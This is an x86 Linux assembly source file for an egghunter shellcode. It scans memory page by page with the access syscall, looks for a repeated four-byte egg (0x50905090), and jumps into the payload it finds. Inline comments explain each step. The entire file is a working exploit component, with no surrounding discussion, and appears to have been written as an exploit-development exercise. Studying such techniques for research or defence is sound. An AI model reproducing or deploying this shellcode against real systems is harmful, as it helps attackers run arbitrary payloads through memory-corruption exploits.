global _start

_start:
        ; set ebx to our EGG
        mov ebx,0x50905090
        ; set to null eax,ecx and edx
        xor ecx,ecx
        mul ecx

jump_to_next_page:
        or dx,0xfff

increment_page:
        inc edx
; save registers
pushad
; load address of tha page to ebx for access system call
lea ebx,[edx+0x4]
mov al,0x21
int 0x80
; compare last byte of eax register with 0xf2(EFAULT return 0xfffffff2 if you cant open page)
cmp al,0xf2
; restore register
popad
; if compare return zero- we cant open memory page and because of that jump to next page
jz jump_to_next_page
; if we can open memory page- compare our egg with 4 bytes in memory
cmp [edx], ebx
; if our momery not identical with egg- jump to increment address
jnz increment_page
; if identical-compare next memory 4 bytes
cmp [edx+0x4], ebx
; if not identical-jump to increment address
jnz increment_page
; if second adress also identical-jump to it and execute
jmp edx
